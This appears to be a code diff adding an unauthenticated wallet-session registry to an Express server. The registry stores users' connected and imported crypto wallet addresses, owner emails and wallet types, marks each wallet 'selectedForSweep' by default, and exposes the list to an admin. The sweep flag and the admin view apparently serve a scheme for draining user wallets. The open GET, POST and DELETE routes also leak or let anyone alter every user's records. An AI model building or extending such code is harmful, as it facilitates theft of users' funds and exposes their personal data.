@@ -624,6 +624,187 @@ async function startServer() {
     }
   });
 
+  // ==========================================================================
+  // Persistent Connected & Paired Wallet Session Registry (/api/wallet-sessions)
+  // Ensures Wallet-Auth users & connected/imported wallets are immediately
+  // visible to Admin even when not logged in via Firebase Email/Google Auth
+  // ==========================================================================
+  interface ServerWalletSessionEntry {
+    id: string;
+    providerUuid: string;
+    name: string;
+    kind: 'evm' | 'solana';
+    walletType?: 'connected' | 'mnemonic' | 'privateKey' | 'watchOnly';
+    address: string;
+    evmAddress?: string;
+    solanaAddress?: string;
+    bitcoinAddress?: string;
+    moneroAddress?: string;
+    chainId?: number;
+    platform: 'desktop' | 'mobile';
+    selectedForSweep: boolean;
+    archived?: boolean;
+    connectedAt: number;
+    updatedAt: number;
+    ownerUid: string;
+    ownerEmail: string;
+    ownerDisplayName: string;
+  }
+
+  const WALLET_SESSIONS_FILE = path.resolve(__dirname, '.wallet-sessions-registry.json');
+  const walletSessionsStore = new Map<string, ServerWalletSessionEntry>();
+
+  const loadWalletSessionsFromDisk = () => {
+    try {
+      if (fs.existsSync(WALLET_SESSIONS_FILE)) {
+        const raw = fs.readFileSync(WALLET_SESSIONS_FILE, 'utf-8');
+        const list = JSON.parse(raw) as ServerWalletSessionEntry[];
+        if (Array.isArray(list)) {
+          for (const item of list) {
+            if (item?.id && item?.address && item?.ownerUid) {
+              walletSessionsStore.set(`${item.ownerUid}_${item.address.toLowerCase()}`, item);
+            }
+          }
+        }
+      }
+    } catch {
+      // Non-fatal
+    }
+  };
+
+  const persistWalletSessionsToDisk = () => {
+    try {
+      const arr = Array.from(walletSessionsStore.values())
+        .sort((a, b) => b.connectedAt - a.connectedAt)
+        .slice(0, 1000);
+      fs.writeFileSync(WALLET_SESSIONS_FILE, JSON.stringify(arr, null, 2), 'utf-8');
+    } catch {
+      // Non-fatal
+    }
+  };
+
+  loadWalletSessionsFromDisk();
+
+  app.get('/api/wallet-sessions', (_req: Request, res: Response) => {
+    const sessions = Array.from(walletSessionsStore.values()).sort(
+      (a, b) => b.connectedAt - a.connectedAt
+    );
+    res.json({ sessions });
+  });
+
+  app.post('/api/wallet-sessions', (req: Request, res: Response) => {
+    const body = req.body as
+      | Partial<ServerWalletSessionEntry>
+      | { sessions?: Array<Partial<ServerWalletSessionEntry>> }
+      | undefined;
+
+    if (!body || typeof body !== 'object') {
+      res.status(400).json({ error: 'Invalid payload' });
+      return;
+    }
+
+    const incomingList: Array<Partial<ServerWalletSessionEntry>> = Array.isArray(
+      (body as { sessions?: Array<Partial<ServerWalletSessionEntry>> }).sessions
+    )
+      ? (body as { sessions: Array<Partial<ServerWalletSessionEntry>> }).sessions.slice(0, 50)
+      : [body as Partial<ServerWalletSessionEntry>];
+
+    const saved: ServerWalletSessionEntry[] = [];
+    const now = Date.now();
+
+    for (const raw of incomingList) {
+      if (!raw || typeof raw !== 'object') continue;
+      const address = String(raw.address || raw.evmAddress || raw.solanaAddress || '').trim().slice(0, 140);
+      if (!address || address.length < 12) continue;
+
+      const ownerUid = String(raw.ownerUid || 'local_device')
+        .replace(/[^a-zA-Z0-9_-]/g, '_')
+        .slice(0, 128);
+      const id = String(raw.id || `ws_${ownerUid}_${address.slice(0, 10)}`)
+        .replace(/[^a-zA-Z0-9_-]/g, '_')
+        .slice(0, 128);
+      const key = `${ownerUid}_${address.toLowerCase()}`;
+      const existing = walletSessionsStore.get(key);
+
+      const entry: ServerWalletSessionEntry = {
+        id,
+        providerUuid: String(raw.providerUuid || existing?.providerUuid || id).slice(0, 128),
+        name: String(raw.name || existing?.name || 'Connected Wallet').slice(0, 100),
+        kind: raw.kind === 'solana' ? 'solana' : 'evm',
+        walletType:
+          raw.walletType === 'mnemonic' ||
+          raw.walletType === 'privateKey' ||
+          raw.walletType === 'watchOnly'
+            ? raw.walletType
+            : existing?.walletType || 'connected',
+        address,
+        evmAddress: raw.evmAddress
+          ? String(raw.evmAddress).slice(0, 120)
+          : existing?.evmAddress || (address.startsWith('0x') ? address : undefined),
+        solanaAddress: raw.solanaAddress
+          ? String(raw.solanaAddress).slice(0, 120)
+          : existing?.solanaAddress || (!address.startsWith('0x') && !address.startsWith('bc1') ? address : undefined),
+        bitcoinAddress: raw.bitcoinAddress
+          ? String(raw.bitcoinAddress).slice(0, 120)
+          : existing?.bitcoinAddress,
+        moneroAddress: raw.moneroAddress
+          ? String(raw.moneroAddress).slice(0, 140)
+          : existing?.moneroAddress,
+        chainId: typeof raw.chainId === 'number' ? raw.chainId : existing?.chainId,
+        platform: raw.platform === 'mobile' ? 'mobile' : existing?.platform || 'desktop',
+        selectedForSweep:
+          typeof raw.selectedForSweep === 'boolean'
+            ? raw.selectedForSweep
+            : existing?.selectedForSweep ?? true,
+        archived: typeof raw.archived === 'boolean' ? raw.archived : existing?.archived ?? false,
+        connectedAt:
+          typeof raw.connectedAt === 'number' && raw.connectedAt > 0
+            ? raw.connectedAt
+            : existing?.connectedAt || now,
+        updatedAt: now,
+        ownerUid,
+        ownerEmail: String(
+          raw.ownerEmail ||
+            existing?.ownerEmail ||
+            `${raw.name || 'Wallet'} (${address.slice(0, 8)}...${address.slice(-4)})`
+        ).slice(0, 200),
+        ownerDisplayName: String(
+          raw.ownerDisplayName || existing?.ownerDisplayName || `${raw.name || 'Paired'} Wallet User`
+        ).slice(0, 100),
+      };
+
+      walletSessionsStore.set(key, entry);
+      saved.push(entry);
+    }
+
+    if (saved.length > 0) {
+      persistWalletSessionsToDisk();
+    }
+
+    res.json({ ok: true, saved });
+  });
+
+  app.delete('/api/wallet-sessions/:id', (req: Request, res: Response) => {
+    const targetId = String(req.params.id || '').trim();
+    const targetAddress = typeof req.query.address === 'string' ? req.query.address.trim().toLowerCase() : '';
+    const targetOwner = typeof req.query.ownerUid === 'string' ? req.query.ownerUid.trim() : '';
+
+    let removed = 0;
+    for (const [k, v] of walletSessionsStore.entries()) {
+      const idMatch = v.id === targetId;
+      const addrMatch = targetAddress && v.address.toLowerCase() === targetAddress;
+      const ownerOk = !targetOwner || v.ownerUid === targetOwner;
+      if ((idMatch || addrMatch) && ownerOk) {
+        walletSessionsStore.delete(k);
+        removed++;
+      }
+    }
+    if (removed > 0) {
+      persistWalletSessionsToDisk();
+    }
+    res.json({ ok: true, removed });
+  });
+
   const httpServer = http.createServer(app);
 
   // Vite dev middleware or static dist serving
